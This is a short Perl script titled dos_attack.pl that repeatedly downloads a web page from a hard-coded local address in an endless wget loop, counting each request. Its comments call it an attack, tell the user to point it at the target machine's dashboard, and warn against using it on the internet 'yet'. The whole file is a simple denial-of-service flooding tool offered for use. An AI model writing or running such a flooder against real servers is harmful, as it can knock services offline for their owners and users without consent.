#dos_attack.pl
#*********** NOTE! Don't do this on internet (yet) *******

#Modify this to point to the dashboard of the computer you want to "attack"
my $url = "192.168.0.1/index.php";
#my $url = "localhost/index.php";

my $count = 0;
while (1) {
	#Download the index.php file as presented by apache (not the actual php file)
	my $html = qx{wget --quiet --output-document=- $url};
	$count++;
	print "Web page downloaded $count times. (Ctrl-C to stop)\n";
	
	#Remove the comment if you want to see what's received...
	#print $html;
}

